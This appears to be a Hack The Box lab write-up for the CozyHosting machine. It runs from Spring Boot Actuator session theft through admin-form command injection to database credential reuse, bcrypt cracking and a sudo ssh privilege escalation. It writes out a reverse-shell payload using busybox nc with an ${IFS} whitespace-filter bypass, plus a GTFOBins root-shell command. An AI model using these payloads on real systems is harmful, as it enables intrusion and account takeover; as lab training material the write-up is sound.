HTB – CozyHosting Machine (Hard) – Spring Boot ➜ Actuator ➜ SSH Injection ➜ DB Dump ➜ Hash Cracking ➜ Root via GTFOBins
🔍 Initial Recon

Started enumeration by scanning the target machine:

rustscan -a 10.10.11.230

Ports Discovered:

    22/tcp – SSH

    80/tcp – HTTP

    8000/tcp – HTTP-Alt (suspected, not used initially)

🌐 Web Enumeration (Port 80)

Identified the site as a hosting platform. Added hostname to system:

echo '10.10.11.230 cozyhosting.htb' | sudo tee -a /etc/hosts

Directory brute-forcing:

feroxbuster -u http://cozyhosting.htb/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html,py,txt,bak

Interesting Routes:

    /login

    /admin

    /logout

    /error – ⚠️ Uncommon & suspicious

⚙️ Tech Stack Fingerprinting

Visiting /error gave a Whitelabel Error Page:

There was an unexpected error (type=None, status=999)

Googling this revealed the site uses the Spring Boot framework:
🔗 https://springhow.com/this-application-has-no-explicit-mapping-for-error/
🚨 Spring Boot Actuator Misconfiguration

Checked for default actuator endpoints:

/actuator/env
/actuator/health
/actuator/sessions

/actuator/sessions revealed active session tokens:

{
  "6F02...95C": "kanderson",
  "7D94...75F": "UNAUTHORIZED",
  ...
}

➡️ Session Hijack Attempt: Used one of kanderson's session tokens to access /admin.

✅ Success: Landed in an admin panel.
📟 SSH Injection → Remote Code Execution

Admin dashboard contained an SSH form to "add hosts".

Tested injection via:

hostname=localhost&username=$(busybox nc 10.10.14.133 5555 -e /bin/bash)

Received error:

Username can't contain whitespaces!

Bypassed whitespace filter using ${IFS}:

hostname=localhost&username=$(busybox${IFS}nc${IFS}10.10.14.120${IFS}4444${IFS}-e${IFS}/bin/bash)

Setup listener:

python3 -m pwncat -lp 4444

💥 Got initial shell as app.
🔍 Local Enumeration

Found running web application:

/app/cloudhosting-0.0.1.jar

Downloaded it via pwncat:

download cloudhosting-0.0.1.jar ./app.jar

Extracted its contents:

jar xvf app.jar

Found DB credentials inside:

./BOOT-INF/classes/application.properties

spring.datasource.url=jdbc:postgresql://localhost:5432/cozyhosting
spring.datasource.username=postgres
spring.datasource.password=V[REDACTED]R

🛢️ PostgreSQL Enumeration

Connected to DB locally:

psql -h localhost -U postgres

Switched to correct DB:

\c cozyhosting

Dumped tables:

SELECT table_name FROM information_schema.tables;

Queried users table:

SELECT * FROM users;

Found:

name     | password (bcrypt)                       | role
-------------------------------------------------------------
kanderson | $2a$10$E/...eH58zim                    | User
admin     | $2a$10$Sp...VO8dm                      | Admin

🔓 Cracking Admin Hash

Saved hash and cracked using Hashcat:

echo '$2a$10$Sp...VO8dm' > admin_hash.txt
hashcat -m 3200 -a 0 admin_hash.txt /usr/share/wordlists/rockyou.txt

✅ Recovered password: m[REDACTED]d
👤 Local User Access

Tried cracked password with user josh:

su josh

✅ Success. User flag retrieved.

Checked sudo permissions:

sudo -l

Output:

(root) /usr/bin/ssh *

⚔️ Privilege Escalation via GTFOBins

Found privilege escalation path on GTFOBins:
🔗 https://gtfobins.github.io/gtfobins/ssh/

Used the following to escalate:

sudo /usr/bin/ssh -o ProxyCommand='; /bin/bash 0<&2 1>&2' x

💥 Root shell obtained:

root@cozyhosting:/home/josh#

🏁 Summary

    🔎 Spring Boot detection via error leak

    🔐 Session hijack → Admin access

    ⚠️ SSH form vulnerable to command injection

    📦 .JAR contained DB creds → DB dump → bcrypt hash extraction

    💣 Local privilege escalation via ssh GTFOBin

